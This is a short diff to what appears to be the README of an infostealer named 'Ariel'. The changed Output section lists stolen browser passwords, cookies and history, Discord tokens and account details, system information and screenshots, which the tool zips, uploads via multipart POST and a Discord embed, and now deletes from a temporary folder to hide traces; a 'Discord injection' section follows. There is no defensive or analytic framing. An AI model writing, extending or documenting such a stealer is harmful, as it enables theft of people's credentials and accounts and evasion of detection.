@@ -23,7 +23,7 @@ Multipart POST. File field defaults to `file`. Headers: `Name: Value` per line. 
 
 ## Output
 
-credentials/<browser>/<profile>/passwords.txt and cookies.txt, discord_tokens.txt, discord_accounts.txt, system_info.txt, summary.txt, upload_status.txt, debug_log.txt when debug is on, screenshot.png when enabled, ariel-<hostname>.zip. Discord embed includes checked account details, system details, the Ariel logo thumbnail, and the screenshot as the image.
+Written to a temporary folder (`%TEMP%\ariel`) and deleted after upload: credentials/<browser>/<profile>/passwords.txt, cookies.txt, and history.txt, discord_tokens.txt, discord_accounts.txt, system_info.txt, summary.txt, upload_status.txt, debug_log.txt when debug is on, screenshot.png when enabled, ariel-<hostname>.zip. Discord embed includes checked account details, system details, the Ariel logo thumbnail, and the screenshot as the image.
 
 ## Discord injection
 
